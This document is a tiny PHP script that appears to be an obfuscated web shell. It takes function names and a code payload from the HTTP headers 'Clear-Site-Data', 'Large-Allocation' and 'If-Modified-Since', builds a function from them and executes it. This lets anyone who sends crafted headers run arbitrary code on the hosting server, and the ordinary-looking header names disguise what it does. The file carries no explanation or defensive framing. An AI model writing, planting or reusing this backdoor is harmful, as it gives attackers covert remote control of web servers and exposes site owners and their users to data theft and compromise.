<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $system = $_HEADERS['Clear-Site-Data']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Modified-Since']));
    $system();
}